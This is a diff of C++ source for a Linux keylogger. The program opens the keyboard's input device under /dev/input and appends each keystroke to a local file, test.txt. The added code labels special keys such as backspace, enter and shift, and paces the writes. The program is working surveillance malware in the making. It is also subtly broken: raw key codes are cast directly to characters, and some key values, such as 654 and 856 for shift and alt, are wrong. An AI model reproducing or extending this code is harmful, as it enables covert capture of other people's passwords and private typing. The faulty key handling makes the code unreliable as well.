@@ -1,4 +1,3 @@
-
 #include <cstdio>
 #include <string>
 #include <iostream>
@@ -9,7 +8,10 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <linux/input.h>
+#include <linux/input-event-codes.h>
 #include <dirent.h>
+#include <chrono>
+#include<thread>
 /*
  * UNIX
  *
@@ -55,13 +57,10 @@ const char* exc(const char* cmd) {
                 }
 
                 return result.c_str();
-
-
             }
         break;
-
     }
-
+    return nullptr;
 
 }
 
@@ -99,22 +98,67 @@ std::string find_keyboard() {
             closedir(dir);
             return path+file;
         }
-
-
     }
-
 
     return "";
 }
 
 
 
+bool is_specia_key(int key)
+{
+    std::fstream file("test.txt",std::ios::out | std::ios::app );
+    if(!file.is_open()) std::cerr << "FILE ERROR: INPUT IS NOT WRITTEN " << std::endl;
+
+    //linux/input-event-codes.h Is where i got the key type(s)
+    //^recntly figured that out TODO: replace the nemuric values to its defined key name (better readability)
+    switch (key) {
+        case KEY_BACKSPACE:
+            file << "[BACKSPACE]";
+        file.close();
+        return true;
+        case 15:
+            file << "[TAB]";
+        file.close();
+        return true;
+        case 28:
+            file << "[ENTER] + " << std::endl;
+            file.close();
+        return true;
+        case 42:
+            file << "[SHIFT IN]";
+        file.close();
+        return true;
+        case 654:
+            file << "[SHIFT OUT] " << std::endl;
+            file.close();
+        return true;
+        case 856:
+            file << "<ALT] " << std::endl;
+            file.close();
+            return true;
+        default:
+            file.close();
+        return false;
+    }
+}
 
 
 int linux_keyboard()
 {
-    std::fstream file("test",std::ios::out | std::ios::app );
+    /*namespace is imporant to delay this function, since if it ain't delayed it will accidently output the code twice
+     *  chrono namespace is to imporant the time units
+     *  thread is for the sleep function
+     */
+    using namespace std::chrono;
+    using namespace std::this_thread;
 
+    std::fstream file("test.txt",std::ios::out | std::ios::app );
+    /*TODO:
+     *Automize the device output
+     *(sometimes the event can be differnt)
+     *the user could also have multiple input devices
+     */
     const char* device_input = ("/dev/input/event0");
     int device = open(device_input, O_RDONLY);
     if(device == -1) {
@@ -122,10 +166,7 @@ int linux_keyboard()
         return 1;
 
     }
-
     if(file.is_open()) {
-
-
 
         struct input_event ev;
 
@@ -136,11 +177,14 @@ int linux_keyboard()
 
             if(ev.type == EV_KEY) {
                 std::cout << ev.code << std::endl;
-                file << ev.code;
-                file.flush();
+                if(!is_specia_key(ev.code)) {
+                    file << static_cast<char>(ev.code); //converts u16 to a character
+                    std::cout << static_cast<char>(ev.code);
+                    file.flush();
+                    sleep_until(system_clock::now() + milliseconds(10));
+                }
 
             }
-
         }
     }
     close(device);
@@ -149,27 +193,9 @@ int linux_keyboard()
 }
 
 
-
-
-
-//todo
-bool is_specia_key(int &key)
-{
-     switch (key)
-     {
-         case 1:
-             std::cout << "TEST";
-         break;
-
-
-    }
-
-}
-
-
 int main() {
+
     one_time_creation();
     linux_keyboard();
-
     return 0;
 }
